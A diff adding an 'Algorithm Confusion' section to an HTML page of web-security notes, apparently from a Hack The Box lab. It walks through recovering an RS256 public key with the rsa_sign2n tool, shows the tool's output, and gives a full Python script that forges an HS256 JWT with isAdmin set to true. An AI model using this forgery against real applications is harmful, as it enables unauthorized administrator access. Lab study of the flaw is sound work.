@@ -1840,6 +1840,17 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#algorithm-confusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Algorithm Confusion
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2206,6 +2217,17 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#algorithm-confusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Algorithm Confusion
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2333,6 +2355,119 @@
 </span></code></pre></div></td></tr></table></div></li>
 <li>Back on <a href="https://jwt.lannysport.net/">JWT Debugger</a> amend payload as required and add signing secret</li>
 <li>Refresh landing page with with amended token</li>
+</ul>
+<h3 id="algorithm-confusion">Algorithm Confusion</h3>
+<p><strong>NOTE</strong>
+Works if the web application uses the algorithm specified in the alg-claim of the JWT to determine the algorithm for signature verification</p>
+<ul>
+<li>Login with non admin account</li>
+<li>Copy JWT token</li>
+<li>Decode at <a href="https://jwt.lannysport.net/">JWT Debugger</a></li>
+<li>Confirm alg value is an asymmetric algorithm (RS256)</li>
+<li>Access the public key used by the web application for signature verification:
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1">git<span class="w"> </span>clone<span class="w"> </span>https://github.com/silentsignal/rsa_sign2n
+</span><span id="__span-4-2"><span class="nb">cd</span><span class="w"> </span>rsa_sign2n/standalone/
+</span><span id="__span-4-3">docker<span class="w"> </span>build<span class="w"> </span>.<span class="w"> </span>-t<span class="w"> </span>sig2n
+</span><span id="__span-4-4">docker<span class="w"> </span>run<span class="w"> </span>-it<span class="w"> </span>sig2n
+</span><span id="__span-4-5">
+</span><span id="__span-4-6"><span class="c1"># Generate two different JWTs signed with the same public key using burp repeater and pass them as args</span>
+</span><span id="__span-4-7">python3<span class="w"> </span>jwt_forgery.py<span class="w"> </span>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc4MTEwNzc5MH0.TaKlletu_olhBl_fxXyiRhqc2T9P4jruXLdqLzIPpU_9mE_njizz9_qslJb_dPZT-ymbvUKmrHvrQM1T6TQR3vDXiXtljBhgtINan_CxCEsbKUaZxcIGmK_DJkl5eNBQla0DO8HpN55AAIoskjysIG2pooYuXhA319cvMVDc4evhpnWaR3Fw8N8_mr-tTmw4_gt6YU21LQwHtUQXWlSPoxbE07wTJD16c63EO9GmcMAobSlWU0PTeGxwydpIP82B7nBC2j4Hu1R-2MWupZoxoo07AYgAZdZiwgdWSDYb5KFNCKRKqnefH4j8OASV0rXIIujN13YC0uUX6Kxm4QamKQ<span class="w"> </span>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc4MTEwNzc3NH0.Ohtmgwts_GmeNm2-dD03-KEGBF7gj-GYUIkQRB0Jz4KK872TGGYPJ4boaA6ttyfsdHRvpakzP3L4soBWblO3INEiyAJ1iY1tO0VkhiJQtpQFcJXoMaunXfDJvonUf-o0r9j9kATXCMDu-ILq_QK3k-Txevvp3FG8FMuJ3tmV6zRjdaNKbF14WrJt0K3PvCRTzDXSmlHd91GSXDcO9PK42Y-FpUzc82H8mNSUHQI8EAAvLtEAqqbeV--s4C_FYcnZjkQxqWSE38BRVVFVBhHOtbt-fvtXVILKUqxVEh6CIoX6pZuWfKf5GewMfQTVui1NRwigUVFemqe3Uf8ADUn20w
+</span><span id="__span-4-8">
+</span><span id="__span-4-9"><span class="c1"># multiple results returned:</span>
+</span><span id="__span-4-10"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Written<span class="w"> </span>to<span class="w"> </span>b1969268f0e66b1c_65537_x509.pem
+</span><span id="__span-4-11"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Tampered<span class="w"> </span>JWT:<span class="w"> </span>b<span class="s1">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.0gp7VdPNIS4bgSUmav9EbBdN9koB3uCg2MezFuAF_Qs&#39;</span>
+</span><span id="__span-4-12"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Written<span class="w"> </span>to<span class="w"> </span>b1969268f0e66b1c_65537_pkcs1.pem
+</span><span id="__span-4-13"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Tampered<span class="w"> </span>JWT:<span class="w"> </span>b<span class="s1">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.gzm7wCp4TP4xvsxw-hF23cbCNEGhVtWsFNj3yopYgqk&#39;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>Back on <a href="https://jwt.lannysport.net/">JWT Debugger</a> past the generated JWT to confirm that it indeed uses a symmetric signature algorithm (HS256)</li>
+<li>Send the generated JWTs as session token to landing page request to conifirm which one is accepted and that app is vulnerable to algorithm confusion
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><span class="c1"># Forge the JWT using the working JWT and the corresponding .pem file, changing isAdmin to true</span>
+</span><span id="__span-5-2">cat<span class="w"> </span>&gt;<span class="w"> </span>forge_admin.py<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+</span><span id="__span-5-3"><span class="s">import base64</span>
+</span><span id="__span-5-4"><span class="s">import hmac</span>
+</span><span id="__span-5-5"><span class="s">import hashlib</span>
+</span><span id="__span-5-6"><span class="s">import json</span>
+</span><span id="__span-5-7">
+</span><span id="__span-5-8"><span class="s"># === WORKING TOKEN FROM jwt_forgery.py ===</span>
+</span><span id="__span-5-9"><span class="s">working_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.0gp7VdPNIS4bgSUmav9EbBdN9koB3uCg2MezFuAF_Qs&quot;</span>
+</span><span id="__span-5-10">
+</span><span id="__span-5-11"><span class="s"># Split</span>
+</span><span id="__span-5-12"><span class="s">header_b64, payload_b64, _ = working_token.split(&#39;.&#39;)</span>
+</span><span id="__span-5-13">
+</span><span id="__span-5-14"><span class="s"># New payload</span>
+</span><span id="__span-5-15"><span class="s">payload = json.loads(base64.urlsafe_b64decode(payload_b64 + &#39;==&#39;).decode())</span>
+</span><span id="__span-5-16"><span class="s">payload[&quot;isAdmin&quot;] = True</span>
+</span><span id="__span-5-17">
+</span><span id="__span-5-18"><span class="s">new_payload_b64 = base64.urlsafe_b64encode(</span>
+</span><span id="__span-5-19"><span class="s">    json.dumps(payload, separators=(&quot;,&quot;, &quot;:&quot;)).encode()</span>
+</span><span id="__span-5-20"><span class="s">).rstrip(b&#39;=&#39;).decode()</span>
+</span><span id="__span-5-21">
+</span><span id="__span-5-22"><span class="s"># Use the corresponding pem key that worked</span>
+</span><span id="__span-5-23"><span class="s">with open(&quot;b1969268f0e66b1c_65537_x509.pem&quot;, &quot;rb&quot;) as f:</span>
+</span><span id="__span-5-24"><span class="s">    key = f.read().strip()</span>
+</span><span id="__span-5-25">
+</span><span id="__span-5-26"><span class="s"># Sign</span>
+</span><span id="__span-5-27"><span class="s">signing_input = f&quot;{header_b64}.{new_payload_b64}&quot;.encode()</span>
+</span><span id="__span-5-28"><span class="s">signature = hmac.new(key, signing_input, hashlib.sha256).digest()</span>
+</span><span id="__span-5-29"><span class="s">sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b&#39;=&#39;).decode()</span>
+</span><span id="__span-5-30">
+</span><span id="__span-5-31"><span class="s">print(&quot;=== ADMIN TOKEN ===&quot;)</span>
+</span><span id="__span-5-32"><span class="s">print(f&quot;{header_b64}.{new_payload_b64}.{sig_b64}&quot;)</span>
+</span><span id="__span-5-33"><span class="s">print(&quot;===================&quot;)</span>
+</span><span id="__span-5-34"><span class="s">EOF</span>
+</span><span id="__span-5-35">
+</span><span id="__span-5-36"><span class="c1"># run the script</span>
+</span><span id="__span-5-37">python3<span class="w"> </span>forge_admin.py
+</span></code></pre></div></td></tr></table></div></li>
+<li>Copy the newly generated token and resend the landing page request with this token</li>
 </ul>
 
 
